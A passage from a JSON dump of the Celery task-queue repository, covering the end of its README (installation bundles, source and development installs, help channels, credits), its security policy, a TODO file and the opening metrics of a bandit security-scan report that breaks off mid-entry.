+--------------------+------------------------+\n    | `Flask`_           | not needed             |\n    +--------------------+------------------------+\n    | `web2py`_          | `web2py-celery`_       |\n    +--------------------+------------------------+\n    | `Tornado`_         | `tornado-celery`_      |\n    +--------------------+------------------------+\n    | `FastAPI`_         | not needed             |\n    +--------------------+------------------------+\n\nThe integration packages aren't strictly necessary, but they can make\ndevelopment easier, and sometimes they add important hooks like closing\ndatabase connections at ``fork``.\n\n.. _`Django`: https://djangoproject.com/\n.. _`Pylons`: http://pylonsproject.org/\n.. _`Flask`: https://flask.palletsprojects.com/\n.. _`web2py`: http://web2py.com/\n.. _`Bottle`: https://bottlepy.org/\n.. _`Pyramid`: https://docs.pylonsproject.org/projects/pyramid/en/latest/\n.. _`pyramid_celery`: https://pypi.org/project/pyramid_celery/\n.. _`celery-pylons`: https://pypi.org/project/celery-pylons/\n.. _`web2py-celery`: https://code.google.com/p/web2py-celery/\n.. _`Tornado`: https://www.tornadoweb.org/\n.. _`tornado-celery`: https://github.com/mher/tornado-celery/\n.. _`FastAPI`: https://fastapi.tiangolo.com/\n\n.. _celery-documentation:\n\nDocumentation\n=============\n\nThe `latest documentation`_ is hosted at Read The Docs, containing user guides,\ntutorials, and an API reference.\n\n.. _`latest documentation`: https://docs.celeryq.dev/en/latest/\n\n.. _celery-installation:\n\nInstallation\n============\n\nYou can install Celery either via the Python Package Index (PyPI)\nor from source.\n\nTo install using ``pip``:\n\n::\n\n\n    $ pip install -U Celery\n\n.. _bundles:\n\nBundles\n-------\n\nCelery also defines a group of bundles that can be used\nto install Celery and the dependencies for a given feature.\n\nYou can specify these in your requirements or on the ``pip``\ncommand-line by using brackets. Multiple bundles can be specified by\nseparating them by commas.\n\n::\n\n\n    $ pip install \"celery[redis]\"\n\n    $ pip install \"celery[redis,auth,msgpack]\"\n\nThe following bundles are available:\n\nSerializers\n~~~~~~~~~~~\n\n:``celery[auth]``:\n    for using the ``auth`` security serializer.\n\n:``celery[msgpack]``:\n    for using the msgpack serializer.\n\n:``celery[yaml]``:\n    for using the yaml serializer.\n\nConcurrency\n~~~~~~~~~~~\n\n:``celery[eventlet]``:\n    for using the ``eventlet`` pool.\n\n:``celery[gevent]``:\n    for using the ``gevent`` pool.\n\nTransports and Backends\n~~~~~~~~~~~~~~~~~~~~~~~\n\n:``celery[amqp]``:\n    for using the RabbitMQ amqp python library.\n\n:``celery[redis]``:\n    for using Redis as a message transport or as a result backend.\n\n:``celery[sqs]``:\n    for using Amazon SQS as a message transport.\n\n:``celery[tblib``]:\n    for using the ``task_remote_tracebacks`` feature.\n\n:``celery[memcache]``:\n    for using Memcached as a result backend (using ``pylibmc``)\n\n:``celery[pymemcache]``:\n    for using Memcached as a result backend (pure-Python implementation).\n\n:``celery[cassandra]``:\n    for using Apache Cassandra/Astra DB as a result backend with the DataStax driver.\n\n:``celery[azureblockblob]``:\n    for using Azure Storage as a result backend (using ``azure-storage``)\n\n:``celery[s3]``:\n    for using S3 Storage as a result backend.\n\n:``celery[gcs]``:\n    for using Google Cloud Storage as a result backend.\n\n:``celery[couchbase]``:\n    for using Couchbase as a result backend.\n\n:``celery[arangodb]``:\n    for using ArangoDB as a result backend.\n\n:``celery[elasticsearch]``:\n    for using Elasticsearch as a result backend.\n\n:``celery[riak]``:\n    for using Riak as a result backend.\n\n:``celery[cosmosdbsql]``:\n    for using Azure Cosmos DB as a result backend (using ``pydocumentdb``)\n\n:``celery[zookeeper]``:\n    for using Zookeeper as a message transport.\n\n:``celery[sqlalchemy]``:\n    for using SQLAlchemy as a result backend (*supported*).\n\n:``celery[pyro]``:\n    for using the Pyro4 message transport (*experimental*).\n\n:``celery[slmq]``:\n    for using the SoftLayer Message Queue transport (*experimental*).\n\n:``celery[consul]``:\n    for using the Consul.io Key/Value store as a message transport or result backend (*experimental*).\n\n:``celery[django]``:\n    specifies the lowest version possible for Django support.\n\n    You should probably not use this in your requirements, it's here\n    for informational purposes only.\n\n:``celery[gcpubsub]``:\n    for using Google Pub/Sub as a message transport.\n\n\n\n.. _celery-installing-from-source:\n\nDownloading and installing from source\n--------------------------------------\n\nDownload the latest version of Celery from PyPI:\n\nhttps://pypi.org/project/celery/\n\nYou can install it by doing the following:\n\n::\n\n\n    $ tar xvfz celery-0.0.0.tar.gz\n    $ cd celery-0.0.0\n    $ python setup.py build\n    # python setup.py install\n\nThe last command must be executed as a privileged user if\nyou aren't currently using a virtualenv.\n\n.. _celery-installing-from-git:\n\nUsing the development version\n-----------------------------\n\nWith pip\n~~~~~~~~\n\nThe Celery development version also requires the development\nversions of ``kombu``, ``amqp``, ``billiard``, and ``vine``.\n\nYou can install the latest snapshot of these using the following\npip commands:\n\n::\n\n\n    $ pip install https://github.com/celery/celery/zipball/main#egg=celery\n    $ pip install https://github.com/celery/billiard/zipball/main#egg=billiard\n    $ pip install https://github.com/celery/py-amqp/zipball/main#egg=amqp\n    $ pip install https://github.com/celery/kombu/zipball/main#egg=kombu\n    $ pip install https://github.com/celery/vine/zipball/main#egg=vine\n\nWith git\n~~~~~~~~\n\nPlease see the Contributing section.\n\n.. _getting-help:\n\nGetting Help\n============\n\n.. _mailing-list:\n\nMailing list\n------------\n\nFor discussions about the usage, development, and future of Celery,\nplease join the `celery-users`_ mailing list.\n\n.. _`celery-users`: https://groups.google.com/group/celery-users/\n\n.. _irc-channel:\n\nIRC\n---\n\nCome chat with us on IRC. The **#celery** channel is located at the\n`Libera Chat`_ network.\n\n.. _`Libera Chat`: https://libera.chat/\n\n.. _bug-tracker:\n\nBug tracker\n===========\n\nIf you have any suggestions, bug reports, or annoyances please report them\nto our issue tracker at https://github.com/celery/celery/issues/\n\n.. _wiki:\n\nWiki\n====\n\nhttps://github.com/celery/celery/wiki\n\nCredits\n=======\n\n.. _contributing-short:\n\nContributors\n------------\n\nThis project exists thanks to all the people who contribute. Development of\n`celery` happens at GitHub: https://github.com/celery/celery\n\nYou're highly encouraged to participate in the development\nof `celery`. If you don't like GitHub (for some reason) you're welcome\nto send regular patches.\n\nBe sure to also read the `Contributing to Celery`_ section in the\ndocumentation.\n\n.. _`Contributing to Celery`:\n    https://docs.celeryq.dev/en/stable/contributing.html\n\n|oc-contributors|\n\n.. |oc-contributors| image:: https://opencollective.com/celery/contributors.svg?width=890&button=false\n    :target: https://github.com/celery/celery/graphs/contributors\n\nBackers\n-------\n\nThank you to all our backers! 🙏 [`Become a backer`_]\n\n.. _`Become a backer`: https://opencollective.com/celery#backer\n\n|oc-backers|\n\n.. |oc-backers| image:: https://opencollective.com/celery/backers.svg?width=890\n    :target: https://opencollective.com/celery#backers\n\nSponsors\n--------\n\nSupport this project by becoming a sponsor. Your logo will show up here with a\nlink to your website. [`Become a sponsor`_]\n\n.. _`Become a sponsor`: https://opencollective.com/celery#sponsor\n\n|oc-sponsor-1| |oc-sponsor-2| |oc-sponsor-3|\n\n.. |oc-sponsor-1| image:: https://opencollective.com/celery/sponsor/0/avatar.svg\n    :target: https://opencollective.com/celery/sponsor/0/website\n\n.. |oc-sponsor-2| image:: ./docs/images/blacksmith-logo-white-on-black.svg\n    :target: https://www.blacksmith.sh/\n    :alt: Blacksmith.sh\n    :width: 240\n    :height: 57\n\n.. |oc-sponsor-3| image:: https://upstash.com/logo/upstash-dark-bg.svg\n    :target: http://upstash.com/?code=celery\n    :alt: Upstash\n    :width: 200\n    :height: 57\n\n.. _license:\n\nLicense\n=======\n\nThis software is licensed under the `New BSD License`. See the ``LICENSE``\nfile in the top distribution directory for the full license text.\n\n.. # vim: syntax=rst expandtab tabstop=4 shiftwidth=4 shiftround\n\n.. |build-status| image:: https://github.com/celery/celery/actions/workflows/python-package.yml/badge.svg\n    :alt: Build status\n    :target: https://github.com/celery/celery/actions/workflows/python-package.yml\n\n.. |coverage| image:: https://codecov.io/github/celery/celery/coverage.svg?branch=main\n    :target: https://codecov.io/github/celery/celery?branch=main\n\n.. |license| image:: https://img.shields.io/pypi/l/celery.svg\n    :alt: BSD License\n    :target: https://opensource.org/licenses/BSD-3-Clause\n\n.. |wheel| image:: https://img.shields.io/pypi/wheel/celery.svg\n    :alt: Celery can be installed via wheel\n    :target: https://pypi.org/project/celery/\n\n.. |semgrep| image:: https://img.shields.io/badge/semgrep-security-green.svg\n    :alt: Semgrep security\n    :target: https://go.semgrep.dev/home\n\n.. |pyversion| image:: https://img.shields.io/pypi/pyversions/celery.svg\n    :alt: Supported Python versions.\n    :target: https://pypi.org/project/celery/\n\n.. |pyimp| image:: https://img.shields.io/pypi/implementation/celery.svg\n    :alt: Supported Python implementations.\n    :target: https://pypi.org/project/celery/\n\n.. |ocbackerbadge| image:: https://opencollective.com/celery/backers/badge.svg\n    :alt: Backers on Open Collective\n    :target: #backers\n\n.. |ocsponsorbadge| image:: https://opencollective.com/celery/sponsors/badge.svg\n    :alt: Sponsors on Open Collective\n    :target: #sponsors\n\n.. |downloads| image:: https://pepy.tech/badge/celery\n    :alt: Downloads\n    :target: https://pepy.tech/project/celery\n"
        },
        {
          "name": "SECURITY.md",
          "type": "blob",
          "size": 0.47,
          "content": "# Security Policy\n\n## Supported Versions\n\nUse this section to tell people about which versions of your project are\ncurrently being supported with security updates.\n\n| Version | Supported          |\n| ------- | ------------------ |\n| 5.3.x   | :white_check_mark: |\n| 5.2.x   | :x:                |\n| 5.1.x   | :x: |\n| < 5.0   | :x:                |\n\n## Reporting a Vulnerability\n\nPlease reach out to auvipy@gmail.com & omer.drow@gmail.com for reporting security concerns via email.\n"
        },
        {
          "name": "TODO",
          "type": "blob",
          "size": 0.08,
          "content": "Please see our Issue Tracker at GitHub:\n    https://github.com/celery/celery/issues\n"
        },
        {
          "name": "bandit.json",
          "type": "blob",
          "size": 73.98,
          "content": "{\n  \"errors\": [],\n  \"generated_at\": \"2021-11-08T00:55:15Z\",\n  \"metrics\": {\n    \"_totals\": {\n      \"CONFIDENCE.HIGH\": 40.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 2.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 40.0,\n      \"SEVERITY.MEDIUM\": 2.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 29546,\n      \"nosec\": 0\n    },\n    \"celery/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 126,\n      \"nosec\": 0\n    },\n    \"celery/__main__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 12,\n      \"nosec\": 0\n    },\n    \"celery/_state.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 119,\n      \"nosec\": 0\n    },\n    \"celery/app/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 56,\n      \"nosec\": 0\n    },\n    \"celery/app/amqp.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 503,\n      \"nosec\": 0\n    },\n    \"celery/app/annotations.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 39,\n      \"nosec\": 0\n    },\n    \"celery/app/autoretry.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 50,\n      \"nosec\": 0\n    },\n    \"celery/app/backends.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 62,\n      \"nosec\": 0\n    },\n    \"celery/app/base.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 1028,\n      \"nosec\": 0\n    },\n    \"celery/app/builtins.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 153,\n      \"nosec\": 0\n    },\n    \"celery/app/control.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 607,\n      \"nosec\": 0\n    },\n    \"celery/app/defaults.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 361,\n      \"nosec\": 0\n    },\n    \"celery/app/events.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 29,\n      \"nosec\": 0\n    },\n    \"celery/app/log.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 198,\n      \"nosec\": 0\n    },\n    \"celery/app/registry.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 49,\n      \"nosec\": 0\n    },\n    \"celery/app/routes.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 107,\n      \"nosec\": 0\n    },\n    \"celery/app/task.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 779,\n      \"nosec\": 0\n    },\n    \"celery/app/trace.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 560,\n      \"nosec\": 0\n    },\n    \"celery/app/utils.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 315,\n      \"nosec\": 0\n    },\n    \"celery/apps/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 0,\n      \"nosec\": 0\n    },\n    \"celery/apps/beat.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 128,\n      \"nosec\": 0\n    },\n    \"celery/apps/multi.py\": {\n      \"CONFIDENCE.HIGH\": 2.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 2.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 426,\n      \"nosec\": 0\n    },\n    \"celery/apps/worker.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 1.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 304,\n      \"nosec\": 0\n    },\n    \"celery/backends/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 1,\n      \"nosec\": 0\n    },\n    \"celery/backends/arangodb.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 201,\n      \"nosec\": 0\n    },\n    \"celery/backends/asynchronous.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 243,\n      \"nosec\": 0\n    },\n    \"celery/backends/azureblockblob.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 126,\n      \"nosec\": 0\n    },\n    \"celery/backends/base.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 809,\n      \"nosec\": 0\n    },\n    \"celery/backends/cache.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 118,\n      \"nosec\": 0\n    },\n    \"celery/backends/cassandra.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 174,\n      \"nosec\": 0\n    },\n    \"celery/backends/consul.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 79,\n      \"nosec\": 0\n    },\n    \"celery/backends/cosmosdbsql.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 169,\n      \"nosec\": 0\n    },\n    \"celery/backends/couchbase.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 79,\n      \"nosec\": 0\n    },\n    \"celery/backends/couchdb.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 77,\n      \"nosec\": 0\n    },\n    \"celery/backends/database/__init__.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 176,\n      \"nosec\": 0\n    },\n    \"celery/backends/database/models.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 83,\n      \"nosec\": 0\n    },\n    \"celery/backends/database/session.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 68,\n      \"nosec\": 0\n    },\n    \"celery/backends/dynamodb.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 380,\n      \"nosec\": 0\n    },\n    \"celery/backends/elasticsearch.py\": {\n      \"CONFIDENCE.HIGH\": 0.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 0.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      \"SEVERITY.UNDEFINED\": 0.0,\n      \"loc\": 192,\n      \"nosec\": 0\n    },\n    \"celery/backends/filesystem.py\": {\n      \"CONFIDENCE.HIGH\": 1.0,\n      \"CONFIDENCE.LOW\": 0.0,\n      \"CONFIDENCE.MEDIUM\": 0.0,\n      \"CONFIDENCE.UNDEFINED\": 0.0,\n      \"SEVERITY.HIGH\": 0.0,\n      \"SEVERITY.LOW\": 1.0,\n      \"SEVERITY.MEDIUM\": 0.0,\n      